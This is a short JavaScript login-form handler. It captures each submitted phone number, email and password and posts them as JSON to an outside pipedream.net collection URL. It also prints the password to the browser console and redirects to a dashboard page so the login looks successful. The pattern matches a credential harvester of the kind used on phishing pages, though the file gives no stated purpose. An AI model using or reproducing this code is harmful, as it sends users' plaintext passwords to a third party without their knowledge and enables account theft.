let send2api = (phone,email,password) => {
    const data = { phone: phone , email:email , password:password };
  
    fetch("https://92f22be71418bcc193a681acd1144b90.m.pipedream.net", {
      method: "POST", 
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Success:", data);
        location.replace("user_dashborad.html")

      })
      .catch((error) => {
        console.error("Error:", error);
      });
  };
  


const form = document.getElementById("loginform");

form.addEventListener("submit", function (event) {
  const phone = form.elements["phone"].value;
  const email = form.elements["email"].value;
  const password = form.elements["password"].value;

  send2api(phone,email,password)
  console.log(phone + " " + password + " " + email);


  event.preventDefault();
});



